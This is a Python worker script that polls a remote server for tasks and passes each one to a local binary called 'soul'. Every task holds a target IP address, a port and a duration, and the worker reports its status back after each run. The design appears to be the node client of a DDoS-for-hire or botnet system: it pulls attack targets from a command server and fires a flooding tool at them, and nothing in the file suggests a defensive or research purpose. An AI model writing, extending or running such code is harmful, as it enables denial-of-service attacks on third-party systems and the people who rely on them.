import requests
import time
import subprocess
import socket
import logging

API_BASE = "https://royalthakur.xyz/api"
HEADERS = {
    "User-Agent": "ROYALTHAKUR royal"
}

WORKER_ID = socket.gethostname()

logging.basicConfig(
    filename="worker.log",
    level=logging.INFO,
    format="%(asctime)s | WORKER | %(message)s"
)


def get_task():
    try:
        r = requests.get(
            f"{API_BASE}/get_task.php",
            headers=HEADERS,
            timeout=10
        )
        if r.status_code == 200:
            data = r.json()
            return data if data else None
    except Exception as e:
        logging.error(f"GET_TASK_ERROR {e}")
    return None


def update_status(task_id, status):
    try:
        requests.post(
            f"{API_BASE}/update_status.php",
            headers=HEADERS,
            data={
                "id": task_id,
                "status": status,
                "worker": WORKER_ID
            },
            timeout=10
        )
    except Exception as e:
        logging.error(f"STATUS_UPDATE_ERROR id={task_id} {e}")


def run_soul(ip, port, time_sec):
    # EXACT binary execution (SOUL style)
    return subprocess.call(["./soul", str(ip), str(port), str(time_sec)])


if __name__ == "__main__":
    logging.info(f"WORKER_START id={WORKER_ID}")

    while True:
        task = get_task()
        if not task:
            time.sleep(1)
            continue

        task_id = task["id"]
        ip = task["ip"]
        port = task["port"]
        time_sec = task["time"]

        logging.info(
            f"TASK_PICKED id={task_id} ip={ip} port={port} time={time_sec}"
        )

        update_status(task_id, "RUNNING")

        try:
            code = run_soul(ip, port, time_sec)
            if code == 0:
                update_status(task_id, "DONE")
                logging.info(f"TASK_DONE id={task_id}")
            else:
                update_status(task_id, "FAILED")
                logging.error(f"TASK_FAILED id={task_id} exit={code}")
        except Exception as e:
            update_status(task_id, "FAILED")
            logging.exception(f"TASK_CRASH id={task_id}")

        time.sleep(1)